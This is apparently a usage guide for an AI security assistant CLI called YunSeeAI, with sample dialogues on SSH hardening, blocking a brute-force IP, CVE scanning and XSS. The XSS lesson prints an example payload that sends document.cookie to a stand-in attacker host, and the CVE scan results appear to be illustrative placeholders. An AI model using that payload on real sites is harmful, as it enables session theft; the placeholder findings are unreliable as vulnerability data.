# YunSeeAI Usage Guide

Complete guide to using YunSeeAI for security tasks.

## Table of Contents

1. [Getting Started](#getting-started)
2. [Basic Commands](#basic-commands)
3. [Natural Language Interface](#natural-language-interface)
4. [Advanced Features](#advanced-features)
5. [Use Cases](#use-cases)
6. [Tips & Tricks](#tips--tricks)

---

## Getting Started

### Starting YunSeeAI

```bash
npm start
```

You'll see the welcome screen:

```
╔══════════════════════════════════════════════════════════════╗
║              YunSeeAI - AI Security Assistant               ║
╚══════════════════════════════════════════════════════════════╝

Welcome to YunSeeAI - Your intelligent security companion

Type /help for commands or just chat naturally
Press Ctrl+C or type exit to quit
```

### Your First Interaction

```
🛡️ You: hello

🤖 YunSeeAI: Hello! I'm YunSeeAI, your AI security assistant.
I can help you with:
- Security configuration audits
- Vulnerability scanning
- Threat detection
- Security best practices

How can I assist you today?
```

---

## Basic Commands

### Built-in System Commands

All system commands start with `/`:

#### `/help` - Show Help

```
🛡️ You: /help
```

Displays all available commands and usage examples.

#### `/status` - System Status

```
🛡️ You: /status
```

Shows:
- AI model status
- Module availability
- Memory usage
- Context window usage

Example output:
```
╔══════════════════════════════════════════════════════════════╗
║                    System Status                             ║
╚══════════════════════════════════════════════════════════════╝

AI Model:
  Status:             ✓ Active
  Context Usage:      25.3% (1033/4096 tokens)
  
Modules:
  🛡️  AI Assistant    ✓ Running
  🔒 WAF Module       ○ Standby
  🔍 Scanner Module   ○ Standby
  ⚙️  Audit Module    ○ Standby
```

#### `/clear` - Clear History

```
🛡️ You: /clear
```

Clears conversation history (but keeps system prompt).

#### `/history` - Show History

```
🛡️ You: /history
```

Displays entire conversation history with timestamps.

#### `/reset` - Reset Session

```
🛡️ You: /reset
```

Completely resets the AI session (fresh start).

#### `/exit` or `/quit` - Exit

```
🛡️ You: /exit
```

Gracefully exits YunSeeAI.

---

## Natural Language Interface

The real power of YunSeeAI is its natural language understanding. Just type what you want!

### Asking Questions

**Security Advice**:
```
🛡️ You: How do I secure my SSH server?

🤖 YunSeeAI: To secure SSH, follow these steps:

1. Disable password authentication
2. Use SSH keys only
3. Change default port
4. Disable root login
5. Use fail2ban for brute-force protection

Would you like me to show you the specific configuration?
```

**Vulnerability Information**:
```
🛡️ You: What is CVE-2023-12345?

🤖 YunSeeAI: [Explains the vulnerability, affected systems, severity, and remediation]
```

**Best Practices**:
```
🛡️ You: What are the best practices for password storage?

🤖 YunSeeAI: [Provides detailed guidance on hashing, salting, algorithms, etc.]
```

### Requesting Actions

**Configuration Checks**:
```
🛡️ You: Check my firewall status

🤖 YunSeeAI: I'll check your firewall configuration...
[Analyzes and reports findings]
```

**Scans**:
```
🛡️ You: Scan my system for vulnerabilities

🤖 YunSeeAI: Starting comprehensive vulnerability scan...
[Performs scan and presents results]
```

**Log Analysis**:
```
🛡️ You: Analyze this log file for suspicious activity

🤖 YunSeeAI: I'll analyze the log entries...
[Identifies anomalies and threats]
```

### Follow-up Questions

YunSeeAI remembers context:

```
🛡️ You: Check my server security

🤖 YunSeeAI: [Performs security audit, finds issues]

🛡️ You: How do I fix the SSH issue?

🤖 YunSeeAI: [Provides specific fix for SSH issue mentioned above]

🛡️ You: Show me the command

🤖 YunSeeAI: [Provides exact command to run]
```

---

## Advanced Features

### Context Management

YunSeeAI maintains conversation context automatically.

**Check Context Usage**:
```
🛡️ You: /status
```

Look for "Context Usage" percentage.

**When Context is Full**:

When approaching 80% context usage:
```
⚠ Context nearly full - consider /clear
```

**Manual Trimming**:
```
🛡️ You: /clear
✓ Conversation history cleared
```

### Multi-turn Conversations

YunSeeAI excels at extended conversations:

```
🛡️ You: I want to improve my server security

🤖 YunSeeAI: Great! Let's start by assessing your current setup.
What operating system are you running?

🛡️ You: Ubuntu 22.04

🤖 YunSeeAI: Excellent. Let me scan your Ubuntu system...
[Performs scan]
I've identified several areas for improvement...

🛡️ You: Start with the most critical

🤖 YunSeeAI: The most critical issue is your SSH configuration...

🛡️ You: Fix it

🤖 YunSeeAI: I'll guide you through fixing SSH:
1. First, backup your current config...
```

### Streaming Responses

Responses stream in real-time:

```
🛡️ You: Explain SQL injection

🤖 YunSeeAI: SQL injection is a code injection technique...
                ▼ (text appears character by character)
```

This provides immediate feedback even for long responses.

---

## Use Cases

### Use Case 1: Server Hardening

**Scenario**: You just deployed a new server and want to secure it.

```
🛡️ You: I just deployed a new Ubuntu server. Help me secure it.

🤖 YunSeeAI: I'll help you harden your server. Let's start with a security audit.

[Performs checks]

Found these issues:
1. SSH allows password authentication (HIGH)
2. Firewall is not enabled (HIGH)
3. Fail2ban not installed (MEDIUM)
4. Unattended-upgrades not configured (MEDIUM)

Shall I guide you through fixing these?

🛡️ You: Yes, start with SSH

🤖 YunSeeAI: To secure SSH:

Step 1: Edit SSH config
sudo nano /etc/ssh/sshd_config

Step 2: Make these changes:
PasswordAuthentication no
PermitRootLogin no
Port 2222 (change from default 22)

Step 3: Restart SSH
sudo systemctl restart sshd

Make sure you have SSH key access before applying!

🛡️ You: Done. Next?

🤖 YunSeeAI: Great! Now let's enable the firewall...
```

### Use Case 2: Incident Response

**Scenario**: You notice suspicious activity.

```
🛡️ You: My server is acting weird. Lots of failed login attempts.

🤖 YunSeeAI: This sounds like a brute-force attack. Let me check your auth logs.

[Analyzes /var/log/auth.log]

Confirmed: Brute-force attack detected
- Source IP: 203.0.113.45
- Attempts: 327 in last hour
- Target: root account

Recommended actions:
1. Block the IP immediately
2. Disable password authentication
3. Install fail2ban

Want me to block this IP now?

🛡️ You: Yes

🤖 YunSeeAI: Blocking IP 203.0.113.45...

Run this command:
sudo ufw deny from 203.0.113.45

Done! The attacker is now blocked.

Now let's set up fail2ban to prevent future attacks...
```

### Use Case 3: Vulnerability Assessment

**Scenario**: Check for known vulnerabilities.

```
🛡️ You: Scan my system for CVE vulnerabilities

🤖 YunSeeAI: Starting CVE scan...

[Scans installed packages against CVE database]

Found 3 vulnerabilities:

1. OpenSSL 1.1.1k - CVE-2023-12345 (HIGH)
   - Remote code execution risk
   - Fix: Upgrade to 1.1.1w
   - Command: sudo apt upgrade openssl

2. Nginx 1.18.0 - CVE-2023-54321 (MEDIUM)
   - Buffer overflow vulnerability
   - Fix: Upgrade to 1.20.2
   - Command: sudo apt upgrade nginx

3. curl 7.68.0 - CVE-2023-99999 (LOW)
   - Information disclosure
   - Fix: Upgrade to 7.88.1
   - Command: sudo apt upgrade curl

Would you like me to generate an upgrade script?

🛡️ You: Yes

🤖 YunSeeAI: Here's the upgrade script:

#!/bin/bash
# Security update script generated by YunSeeAI
sudo apt update
sudo apt upgrade openssl nginx curl -y
sudo systemctl restart nginx

Save this as update.sh and run: chmod +x update.sh && ./update.sh
```

### Use Case 4: Learning Security

**Scenario**: You want to learn about security concepts.

```
🛡️ You: Teach me about XSS attacks

🤖 YunSeeAI: Cross-Site Scripting (XSS) is one of the most common web vulnerabilities.

**What is XSS?**
XSS allows attackers to inject malicious scripts into web pages viewed by other users.

**Types:**
1. Reflected XSS - Script in URL parameter
2. Stored XSS - Script saved in database
3. DOM-based XSS - Client-side code vulnerability

**Example Attack:**
<script>
  fetch('https://attacker.com/?cookie=' + document.cookie)
</script>

**Prevention:**
1. Sanitize all user input
2. Use Content Security Policy (CSP)
3. Encode output
4. Use HTTPOnly cookies

Want to see a practical example?

🛡️ You: Yes, show me how to prevent it in Node.js

🤖 YunSeeAI: Here's how to prevent XSS in Express.js:

[Provides code examples and explanations]
```

---

## Tips & Tricks

### Efficient Communication

**Be Specific**:
```
❌ Bad: "Check server"
✅ Good: "Check my Ubuntu server's SSH configuration for security issues"
```

**Use Follow-ups**:
```
🛡️ You: Scan for vulnerabilities

🤖 YunSeeAI: [Shows results]

🛡️ You: Which is most critical?
🛡️ You: How do I fix the OpenSSL issue?
🛡️ You: Show me the command
```

**Ask for Clarification**:
```
🛡️ You: I don't understand what fail2ban does

🤖 YunSeeAI: [Explains in detail]

🛡️ You: Explain it like I'm a beginner

🤖 YunSeeAI: [Simplifies explanation]
```

### Productivity Shortcuts

**Quick Status Check**:
```
🛡️ You: /status
```

**Fast Exit**:
```
Press Ctrl+C twice (or type: exit)
```

**Clear Clutter**:
```
🛡️ You: /clear
```

### Best Practices

1. **Regular Checks**: Run security audits weekly
   ```
   🛡️ You: Run a full security audit
   ```

2. **Keep Context Clean**: Clear history when switching topics
   ```
   🛡️ You: /clear
   ```

3. **Save Important Info**: Copy commands and configs to notes

4. **Follow Recommendations**: Act on critical findings immediately

5. **Learn as You Go**: Ask "why" to understand security concepts

### Common Patterns

**Pattern 1: Audit → Fix → Verify**
```
🛡️ You: Audit my server security
🛡️ You: Fix the critical issues
🛡️ You: Verify the fixes worked
```

**Pattern 2: Learn → Apply → Test**
```
🛡️ You: Explain SQL injection prevention
🛡️ You: Show me how to implement it
🛡️ You: How do I test if it's working?
```

**Pattern 3: Detect → Analyze → Respond**
```
🛡️ You: I see suspicious logs
🛡️ You: Analyze these entries: [paste logs]
🛡️ You: What should I do?
```

---

## Keyboard Shortcuts

- **Ctrl+C**: Interrupt/Exit
- **↑ / ↓**: Command history (if supported by terminal)
- **Tab**: Autocomplete (if enabled)
- **Ctrl+L**: Clear screen (terminal native)

---

## Next Steps

- Explore [Advanced Configuration](CONFIGURATION.md)
- Read [Security Best Practices](SECURITY.md)
- Check [API Documentation](API.md) for integrations
- Join [Community Discussions](https://github.com/yourusername/yunsee-ai/discussions)

---

**Happy securing!** 🛡️


